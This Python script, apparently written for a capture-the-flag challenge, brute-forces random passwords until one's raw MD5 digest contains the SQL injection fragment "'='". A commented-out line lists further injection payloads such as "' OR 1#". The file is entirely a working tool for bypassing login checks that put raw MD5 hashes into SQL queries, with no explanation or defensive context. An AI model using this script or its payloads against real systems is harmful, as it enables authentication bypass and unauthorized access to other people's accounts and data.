import secrets
import hashlib
import re
import binascii
import string

def newpassword():
	#pword = secrets.token_bytes(16)
	pword = ''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(16))
	return pword

def hash(pword):
	m = hashlib.md5()
	m.update(pword.encode())
	return m.digest()



if __name__ == "__main__":
	a = 0
	#["' OR 1#", "' oR 1#", "' or 1#", "' Or 1#", "'OR 1#", "'or 1#", "'Or 1#", "'oR 1#", "' || 1#", "'|| 1#", "'||' 1",
	codes =  b"'='"
	pword = newpassword()
	hashed = hash(pword)
	while re.search(codes, hashed) == None:
		pword = newpassword()
		hashed = hash(pword)
	print(codes)
	print(hashed)
	print(pword)
